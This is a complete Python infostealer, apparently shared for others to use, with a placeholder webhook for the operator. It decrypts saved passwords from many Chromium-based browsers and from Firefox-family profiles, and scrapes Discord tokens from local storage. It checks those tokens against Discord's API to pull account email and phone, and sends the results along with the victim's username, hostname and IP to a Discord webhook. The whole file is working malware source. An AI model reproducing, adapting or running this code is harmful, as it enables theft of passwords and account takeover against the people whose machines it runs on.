import os
import re
import json
import base64
import sqlite3
import shutil
import socket
import getpass
import ctypes
import requests
from Crypto.Cipher import AES
import win32crypt
# remove the example webhook in between "webhook" with your own

webhook = "put your token here fcking skid lol"



# this list took me forever to make 😭
chromium_browsers = {
    "Chrome":               os.path.join(os.environ["LOCALAPPDATA"], "Google\\Chrome\\User Data"),
    "Chrome Beta":          os.path.join(os.environ["LOCALAPPDATA"], "Google\\Chrome Beta\\User Data"),
    "Chrome Dev":           os.path.join(os.environ["LOCALAPPDATA"], "Google\\Chrome Dev\\User Data"),
    "Edge":                 os.path.join(os.environ["LOCALAPPDATA"], "Microsoft\\Edge\\User Data"),
    "Edge Beta":            os.path.join(os.environ["LOCALAPPDATA"], "Microsoft\\Edge Beta\\User Data"),
    "Brave":                os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware\\Brave-Browser\\User Data"),
    "Brave Beta":           os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware\\Brave-Browser-Beta\\User Data"),
    "Opera":                os.path.join(os.environ["APPDATA"], "Opera Software\\Opera Stable"),
    "Opera GX":             os.path.join(os.environ["APPDATA"], "Opera Software\\Opera GX Stable"),
    "Vivaldi":              os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi\\User Data"),
    "Yandex":               os.path.join(os.environ["LOCALAPPDATA"], "Yandex\\YandexBrowser\\User Data"),
    "Chromium":             os.path.join(os.environ["LOCALAPPDATA"], "Chromium\\User Data"),
    "Epic Privacy Browser": os.path.join(os.environ["LOCALAPPDATA"], "Epic Privacy Browser\\User Data"),
    "Comodo Dragon":        os.path.join(os.environ["LOCALAPPDATA"], "Comodo\\Dragon\\User Data"),
    "CentBrowser":          os.path.join(os.environ["LOCALAPPDATA"], "CentBrowser\\User Data"),
    "7Star":                os.path.join(os.environ["LOCALAPPDATA"], "7Star\\7Star\\User Data"),
    "Sputnik":              os.path.join(os.environ["LOCALAPPDATA"], "Sputnik\\Sputnik\\User Data"),
    "Torch":                os.path.join(os.environ["LOCALAPPDATA"], "Torch\\User Data"),
    "Slimjet":              os.path.join(os.environ["LOCALAPPDATA"], "Slimjet\\User Data"),
    "Orbitum":              os.path.join(os.environ["LOCALAPPDATA"], "Orbitum\\User Data"),
    "Amigo":                os.path.join(os.environ["LOCALAPPDATA"], "Amigo\\User Data"),
    "Chedot":               os.path.join(os.environ["LOCALAPPDATA"], "Chedot\\User Data"),
    "UC Browser":           os.path.join(os.environ["LOCALAPPDATA"], "UCBrowser\\User Data"),
    "CocCoc":               os.path.join(os.environ["LOCALAPPDATA"], "CocCoc\\Browser\\User Data"),
    "Iridium":              os.path.join(os.environ["LOCALAPPDATA"], "Iridium\\User Data"),
}

firefox_browsers = {
    "Firefox":     os.path.join(os.environ["APPDATA"], "Mozilla\\Firefox\\Profiles"),
    "Waterfox":    os.path.join(os.environ["APPDATA"], "Waterfox\\Profiles"),
    "Pale Moon":   os.path.join(os.environ["APPDATA"], "Moonchild Productions\\Pale Moon\\Profiles"),
    "SeaMonkey":   os.path.join(os.environ["APPDATA"], "Mozilla\\SeaMonkey\\Profiles"),
    "Thunderbird": os.path.join(os.environ["APPDATA"], "Thunderbird\\Profiles"),
}

discord_paths = {
    "Discord":        os.path.join(os.environ["APPDATA"], "Discord\\Local Storage\\leveldb"),
    "Discord PTB":    os.path.join(os.environ["APPDATA"], "discordptb\\Local Storage\\leveldb"),
    "Discord Canary": os.path.join(os.environ["APPDATA"], "discordcanary\\Local Storage\\leveldb"),
    "Discord Dev":    os.path.join(os.environ["APPDATA"], "discorddevelopment\\Local Storage\\leveldb"),
}

token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")

def getkey(path):
    try:
        f = open(os.path.join(path, "Local State"), "r")
        stuff = json.loads(f.read())
        f.close()
        key = base64.b64decode(stuff["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except:
        return None

def tryDecrypt(encpass, key):
    try:
        iv = encpass[3:15]
        encpass = encpass[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encpass)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(encpass, None, None, None, 0)[1].decode())
        except:
            return "couldnt decrypt"

def grabChromiumPasswords(browsername, browserpath):
    key = getkey(browserpath)
    if key == None:
        return []

    passwords = []
    profilelist = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]

    for profile in profilelist:
        logindb = browserpath + "\\" + profile + "\\Login Data"

        if not os.path.exists(logindb):
            continue

        tempfile = os.environ["TEMP"] + "\\lgdata_tmp.db"
        shutil.copy2(logindb, tempfile)

        try:
            db = sqlite3.connect(tempfile)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            db.close()

            for row in rows:
                url = row[0]
                username = row[1]
                encryptedpass = row[2]

                if username == "" and encryptedpass == b"":
                    continue

                password = tryDecrypt(encryptedpass, key)
                entry = "URL: " + url + "\nUsername: " + username + "\nPassword: " + password
                passwords.append(entry)

        except Exception as e:
            print("error:", e)

        try:
            os.remove(tempfile)
        except:
            pass

    return passwords

def findFirefoxInstall():
    paths = [
        "C:\\Program Files\\Mozilla Firefox",
        "C:\\Program Files (x86)\\Mozilla Firefox",
    ]
    for p in paths:
        if os.path.exists(os.path.join(p, "nss3.dll")):
            return p
    return None

class SECItem(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_uint),
        ("data", ctypes.POINTER(ctypes.c_ubyte)),
        ("len", ctypes.c_uint)
    ]

nss3 = None

def loadNSS(firefoxInstallPath, profilePath):
    global nss3
    try:
        os.environ["PATH"] = firefoxInstallPath + ";" + os.environ["PATH"]
        nss3 = ctypes.CDLL(os.path.join(firefoxInstallPath, "nss3.dll"))
        nss3.NSS_Init(profilePath.encode("utf-8"))
        return True
    except:
        return False

def unloadNSS():
    global nss3
    try:
        if nss3:
            nss3.NSS_Shutdown()
            nss3 = None
    except:
        pass

def decryptFirefox(encryptedValue):
    global nss3
    try:
        enc_bytes = base64.b64decode(encryptedValue)
        input_item = SECItem()
        input_item.data = (ctypes.c_ubyte * len(enc_bytes))(*enc_bytes)
        input_item.len = len(enc_bytes)

        output_item = SECItem()

        if nss3.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None) == 0:
            result = bytes(output_item.data[:output_item.len])
            nss3.SECITEM_FreeItem(ctypes.byref(output_item), False)
            return result.decode("utf-8", errors="ignore")
    except:
        pass
    return "couldnt decrypt"

def grabFirefoxPasswords(browsername, profilesPath):
    firefoxInstall = findFirefoxInstall()
    if not firefoxInstall:
        return []

    if not os.path.exists(profilesPath):
        return []

    passwords = []

    try:
        profileDirs = [d for d in os.listdir(profilesPath) if os.path.isdir(os.path.join(profilesPath, d))]
    except:
        return []

    for profile in profileDirs:
        profilePath = os.path.join(profilesPath, profile)
        loginsFile = os.path.join(profilePath, "logins.json")

        if not os.path.exists(loginsFile):
            continue

        if not loadNSS(firefoxInstall, profilePath):
            continue

        try:
            with open(loginsFile, "r", encoding="utf-8") as f:
                loginsData = json.loads(f.read())

            for login in loginsData.get("logins", []):
                url = login.get("hostname", "")
                username = decryptFirefox(login.get("encryptedUsername", ""))
                password = decryptFirefox(login.get("encryptedPassword", ""))

                entry = "URL: " + url + "\nUsername: " + username + "\nPassword: " + password
                passwords.append(entry)
        except Exception as e:
            print("error:", e)

        unloadNSS()

    return passwords

def grabDiscordTokens():
    found_tokens = []
    seen = set()

    for client_name, leveldb_path in discord_paths.items():
        if not os.path.exists(leveldb_path):
            continue

        try:
            for filename in os.listdir(leveldb_path):
                if not filename.endswith(".ldb") and not filename.endswith(".log"):
                    continue

                filepath = os.path.join(leveldb_path, filename)
                try:
                    with open(filepath, "r", errors="ignore") as f:
                        content = f.read()
                        tokens = token_pattern.findall(content)
                        for token in tokens:
                            if token not in seen:
                                seen.add(token)
                                found_tokens.append(client_name + ": " + token)
                except:
                    pass
        except:
            pass

    for browser_name, browser_path in chromium_browsers.items():
        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
            ldb_path = os.path.join(browser_path, profile, "Local Storage", "leveldb")
            if not os.path.exists(ldb_path):
                continue

            try:
                for filename in os.listdir(ldb_path):
                    if not filename.endswith(".ldb") and not filename.endswith(".log"):
                        continue

                    filepath = os.path.join(ldb_path, filename)
                    try:
                        with open(filepath, "r", errors="ignore") as f:
                            content = f.read()
                            tokens = token_pattern.findall(content)
                            for token in tokens:
                                if token not in seen:
                                    seen.add(token)
                                    found_tokens.append(browser_name + "/" + profile + ": " + token)
                    except:
                        pass
            except:
                pass

    return found_tokens

def validateToken(token):
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            username = data.get("username", "unknown") + "#" + data.get("discriminator", "0000")
            email = data.get("email", "no email")
            phone = data.get("phone", "no phone")
            nitro = "Nitro" if data.get("premium_type", 0) > 0 else "No Nitro"
            return username + " | " + email + " | " + phone + " | " + nitro
        return None
    except:
        return None

def sendToDiscord(message):
    chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
    for chunk in chunks:
        data = {"content": "```" + chunk + "```"}
        try:
            requests.post(webhook, json=data)
        except:
            pass

def getsysinfo():
    info = "User: " + getpass.getuser() + "\n"
    info += "PC Name: " + socket.gethostname() + "\n"
    info += "IP: " + socket.gethostbyname(socket.gethostname()) + "\n"
    return info

alldata = []
alldata.append(getsysinfo())

tokens = grabDiscordTokens()
if len(tokens) > 0:
    alldata.append("\n=== Discord Tokens ===")
    for t in tokens:
        source = t.split(": ")[0]
        token = t.split(": ")[1]
        info = validateToken(token)
        if info:
            alldata.append("Source: " + source + "\nToken: " + token + "\nAccount: " + info)
        else:
            alldata.append("Source: " + source + "\nToken: " + token + "\nAccount: invalid/expired")

for name, path in chromium_browsers.items():
    if os.path.exists(path):
        found = grabChromiumPasswords(name, path)
        if len(found) > 0:
            alldata.append("\n=== " + name + " ===")
            for p in found:
                alldata.append(p)

for name, path in firefox_browsers.items():
    if os.path.exists(path):
        found = grabFirefoxPasswords(name, path)
        if len(found) > 0:
            alldata.append("\n=== " + name + " ===")
            for p in found:
                alldata.append(p)

finaloutput = "\n\n".join(alldata)

if finaloutput.strip() == "":
    sendToDiscord("nothing found lol")
else:
    sendToDiscord(finaloutput)

#thanks for stealing my code for free lol
